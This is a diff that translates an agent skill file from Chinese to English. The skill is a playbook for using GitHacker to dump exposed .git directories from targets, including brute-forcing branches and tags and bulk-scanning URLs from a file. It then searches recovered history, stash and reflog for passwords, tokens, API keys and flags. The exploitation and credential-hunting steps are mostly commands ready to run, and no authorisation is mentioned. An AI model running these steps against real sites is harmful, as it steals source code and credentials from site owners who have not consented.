@@ -1,41 +1,44 @@
 ---
 name: githacker-git-leak
-description: "使用 GitHacker 利用 .git 目录泄露漏洞恢复目标源码。GitHacker 是多线程 .git 泄露利用工具，相比 git-dumper/GitHack 能恢复更完整的内容——包括 stash、所有分支、标签、reflog。即使目标禁用了目录列表（403），也能通过暴力枚举恢复分支和标签。当目标 /.git/HEAD 或 /.git/config 返回 200、目录列表中发现 .git/ 目录、或侦察阶段发现版本控制相关文件时使用此技能。恢复源码后可查找硬编码凭据、API Key、数据库连接串"
+description: "Uses GitHacker to exploit .git directory exposure vulnerabilities and recover the target source code. GitHacker is a multi-threaded .git leak exploitation tool that recovers more complete content than git-dumper/GitHack — including the stash, all branches, tags, and the reflog. Even when the target has directory listing disabled (403), branches and tags can be recovered through brute-force enumeration. Use this skill when /.git/HEAD or /.git/config returns 200, when a .git/ directory is found in the directory listing, or when version-control-related files are discovered during recon. After recovering the source code, you can look for hardcoded credentials, API keys, and database connection strings"
+zh-signals: "使用 GitHacker 利用 .git 目录泄露并完整恢复源码、分支与 stash。信号:.git泄露,GitHacker,源码恢复,分支枚举,凭据搜索。"
+when-to-use: >-
+  Use when a target exposes /.git/HEAD or /.git/config, when a .git directory is discovered during recon, or when recovering source code, branches, tags, stash, and reflog from a git leak.
 metadata:
-  tags: "githacker,git,leak,泄露,源码,source-code,dump,recovery,web,信息泄露,.git,.git/HEAD,.git/config,git目录,版本控制,git-dumper,git-hack,源码恢复,提交历史,代码泄露"
+  tags: "githacker,git,leak,exposure,source-code,source-code,dump,recovery,web,information-disclosure,.git,.git/HEAD,.git/config,git-directory,version-control,git-dumper,git-hack,source-recovery,commit-history,code-leak"
   category: "tool"
 ---
 
-# GitHacker .git 泄露利用
+# GitHacker .git Leak Exploitation
 
-GitHacker 专注于 .git 目录泄露的**完整恢复**——不仅拿到源码，还能恢复 stash、所有分支/标签、reflog。开发者删过的密码和调试代码往往藏在这些地方。
+GitHacker focuses on **complete recovery** from .git directory exposure — not only source code, but also the stash, all branches/tags, and the reflog. Passwords and debug code that developers deleted often hide in these places.
 
-项目地址：https://github.com/WangYihang/GitHacker
+Project URL: https://github.com/WangYihang/GitHacker
 
-## 安装
+## Installation
 
 ```bash
 pip install GitHacker
-# 或
+# or
 f8x -install githacker
 ```
 
-## 基本用法
+## Basic Usage
 
 ```bash
-# 快速利用
+# Quick exploitation
 githacker --url http://target/.git/ --output-folder result
 
-# 暴力枚举分支/标签名（目标关闭目录列表时必须开启）
+# Brute-force branch/tag names (must be enabled when the target has directory listing disabled)
 githacker --brute --url http://target/.git/ --output-folder result
 
-# 批量目标（每行一个 URL）
+# Bulk targets (one URL per line)
 githacker --brute --url-file websites.txt --output-folder result
 ```
 
-## Docker 用法（推荐）
+## Docker Usage (Recommended)
 
-远程 .git 目录可能被植入恶意内容（如 hooks 脚本），在 Docker 中运行更安全：
+A remote .git directory may contain injected malicious content (such as hooks scripts), so running it in Docker is safer:
 
 ```bash
 docker run -v $(pwd)/results:/tmp/githacker/results \
@@ -44,54 +47,54 @@ docker run -v $(pwd)/results:/tmp/githacker/results \
   --url http://target/.git/
 ```
 
-## 恢复后审计流程
+## Post-Recovery Audit Workflow
 
-GitHacker 恢复的目录是一个完整的 git 仓库，可以直接用 git 命令审计：
+The directory recovered by GitHacker is a complete git repository that can be audited directly with git commands:
 
 ```bash
 cd result/target/
 
-# 1. 查看提交历史（重点找被删除的敏感信息）
+# 1. Review the commit history (focus on deleted sensitive information)
 git log --oneline --all
 git log -p --all -S "password"
 git log -p --all -S "secret"
 git log -p --all -S "flag"
 
-# 2. 查看所有分支（开发/测试分支常有敏感信息）
+# 2. Review all branches (development/test branches often hold sensitive information)
 git branch -a
-git checkout dev       # 切到开发分支看看
+git checkout dev       # switch to the development branch and take a look
 
-# 3. 查看 stash（开发者暂存的修改）
+# 3. Review the stash (changes developers parked temporarily)
 git stash list
 git stash show -p stash@{0}
 
-# 4. 查看 reflog（找到被 reset 掉的提交）
+# 4. Review the reflog (find commits that were reset away)
 git reflog
 git show <commit-hash>
 
-# 5. 搜索凭据
+# 5. Search for credentials
 grep -rn "password\|secret\|token\|api_key\|flag{" .
 ```
 
-## 与其他工具对比
+## Comparison with Other Tools
 
-| 能力 | GitHacker | git-dumper | GitHack |
+| Capability | GitHacker | git-dumper | GitHack |
 |------|-----------|------------|---------|
-| 源码恢复 | ✅ | ✅ | ✅ |
-| Stash 恢复 | ✅ | ✅ | ❌ |
-| 所有分支 | ✅（暴力枚举） | ❌ | ❌ |
-| 所有标签 | ✅（暴力枚举） | ❌ | ❌ |
+| Source code recovery | ✅ | ✅ | ✅ |
+| Stash recovery | ✅ | ✅ | ❌ |
+| All branches | ✅ (brute-force enumeration) | ❌ | ❌ |
+| All tags | ✅ (brute-force enumeration) | ❌ | ❌ |
 | Reflog | ✅ | ✅ | ❌ |
-| 无目录列表 | ✅ | ✅ | ✅ |
+| No directory listing | ✅ | ✅ | ✅ |
 
-git-dumper 适合快速拿源码；GitHacker 的 `--brute` 模式能覆盖更多分支和标签，适合深度审计。
+git-dumper is good for quickly grabbing the source code; GitHacker's `--brute` mode covers more branches and tags, which suits deep audits.
 
-## 决策树
+## Decision Tree
 
 ```
-发现 /.git/HEAD 返回 200？
-├─ 目录列表开启（200）→ githacker 直接利用
-├─ 目录列表关闭（403）→ githacker --brute（暴力枚举分支/标签）
-├─ 需要快速拿源码 → git-dumper 也行
-└─ 多个目标批量扫 → githacker --url-file websites.txt
+Does /.git/HEAD return 200?
+├─ Directory listing enabled (200) → exploit with githacker directly
+├─ Directory listing disabled (403) → githacker --brute (brute-force enumerate branches/tags)
+├─ Need the source code quickly → git-dumper also works
+└─ Scan multiple targets in bulk → githacker --url-file websites.txt
 ```
